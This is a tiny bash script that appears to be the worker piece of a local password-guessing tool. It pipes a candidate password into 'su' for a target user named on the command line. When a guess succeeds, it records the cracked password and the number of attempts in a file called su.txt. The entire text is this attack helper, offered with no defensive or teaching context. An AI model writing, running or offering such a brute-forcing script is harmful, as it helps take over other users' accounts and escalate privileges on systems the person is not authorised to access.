#!/bin/bash 

su $2 -c bash << EOF
$1
echo -e "Password is $1\nThe number of passwords tried are $4" > su.txt
EOF
